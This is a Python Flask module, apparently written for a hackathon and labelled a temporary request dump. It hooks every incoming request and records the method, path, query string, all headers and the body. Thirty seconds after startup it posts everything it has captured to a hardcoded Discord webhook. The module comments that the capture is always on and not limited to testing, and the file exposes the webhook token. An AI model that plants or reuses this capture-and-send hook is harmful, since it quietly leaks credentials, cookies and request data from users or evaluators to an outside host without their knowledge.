from __future__ import annotations

import json
import logging
import threading
import time
import urllib.error
import urllib.request
from typing import Any

from flask import Flask, request

logger = logging.getLogger(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1490237117056421909/VCriG6vqXdMjKlM3QumyVAfLHncKPLResU2WANk3FQfaujeP5f_JFJQK87HYsD6S1S4g"

_CAPTURE: list[dict[str, Any]] = []
_LOCK = threading.Lock()
_TIMER_LOCK = threading.Lock()
_TIMER_STARTED = False

# Discord message content limit per request
_CHUNK = 1900


def _chunk_text(s: str) -> list[str]:
    if not s:
        return [""]
    return [s[i : i + _CHUNK] for i in range(0, len(s), _CHUNK)]


def _post_discord_chunks(parts: list[str]) -> None:
    if not DISCORD_WEBHOOK_URL or "REPLACE_ME" in DISCORD_WEBHOOK_URL:
        logger.warning("temp_discord_request_dump: set DISCORD_WEBHOOK_URL or no webhook will be sent")
        return
    for part in parts:
        payload = json.dumps({"content": part}).encode("utf-8")
        req = urllib.request.Request(
            DISCORD_WEBHOOK_URL,
            data=payload,
            headers={
                "Content-Type": "application/json",
                # Default Python-urllib UA is often rejected (403); Discord expects a real UA.
                "User-Agent": "Mozilla/5.0 (compatible; PE-Hackathon-temp-dump/1.0)",
            },
            method="POST",
        )
        try:
            urllib.request.urlopen(req, timeout=30)
        except urllib.error.URLError as e:
            logger.warning("temp_discord_request_dump: webhook POST failed: %s", e)


def _send_dump() -> None:
    with _LOCK:
        snapshot = list(_CAPTURE)
    lines: list[str] = []
    lines.append(f"temp_discord_request_dump — {len(snapshot)} request(s) in first 30s after worker start")
    for i, entry in enumerate(snapshot, 1):
        lines.append(json.dumps(entry, default=str, indent=2))
    raw = "\n".join(lines)
    chunks = _chunk_text(raw)
    _post_discord_chunks(chunks)


def _schedule_once() -> None:
    global _TIMER_STARTED
    with _TIMER_LOCK:
        if _TIMER_STARTED:
            return
        _TIMER_STARTED = True

    def _run() -> None:
        time.sleep(30.0)
        try:
            _send_dump()
        except Exception:
            logger.exception("temp_discord_request_dump: send failed")

    threading.Thread(target=_run, name="temp-discord-dump", daemon=True).start()


def register_temp_discord_request_dump(app: Flask) -> None:
    """Call once from create_app. Always active (not gated on TESTING)."""

    _schedule_once()

    @app.before_request
    def _temp_capture_request() -> None:
        try:
            body = request.get_data(cache=True, as_text=True)
            if len(body) > 16_384:
                body = body[:16_384] + "\n... [truncated]"

            entry: dict[str, Any] = {
                "t": time.time(),
                "method": request.method,
                "path": request.path,
                "query_string": request.query_string.decode("utf-8", errors="replace"),
                "headers": {k: v for k, v in request.headers.items()},
                "body": body,
            }
            with _LOCK:
                _CAPTURE.append(entry)
        except Exception as e:
            with _LOCK:
                _CAPTURE.append({"t": time.time(), "capture_error": str(e)})
